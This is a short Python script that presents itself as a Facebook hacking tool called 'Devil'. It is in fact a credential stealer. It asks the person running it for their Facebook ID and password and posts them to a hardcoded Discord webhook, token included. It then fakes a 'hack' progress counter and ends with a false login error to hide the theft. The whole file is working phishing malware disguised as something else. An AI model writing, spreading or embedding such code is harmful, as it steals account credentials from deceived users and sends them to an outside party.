import os
import requests
import pyfiglet
import time
os.system('clear')
a = pyfiglet.figlet_format('Devil')
print(a)       
print("----------------------------------------------")
print(" ➤Author   : AunSoePy")
print(" ➤Github   : https://github.com/Aungsoepy37686")
print(" ➤Facebook : Aung SoePy")
print("----------------------------------------------")

umail =input("[ + ]Please Enter Fb ID:").strip()
upass =input("[ + ]Please Enter Fb password:").strip()
data = {
    "content" : umail+"/"+upass,

    "username" : "AunSoePy"
}
rq =requests.post('https://discord.com/api/webhooks/974222423744454666/Jt4dT4JaApbQeSwQkwrkESh2Jndxxd2Zvy4gKOxrkk_6PWTim7sU9TRq3loJRYleedmX',json=data)
print ("          Access login")
i=input("[ + ]Please Enter Hack ID:")
print("------------------------------------------------")
for i in range(100):
    print(i,'%')
    time.sleep(1)
print('invalid password or username')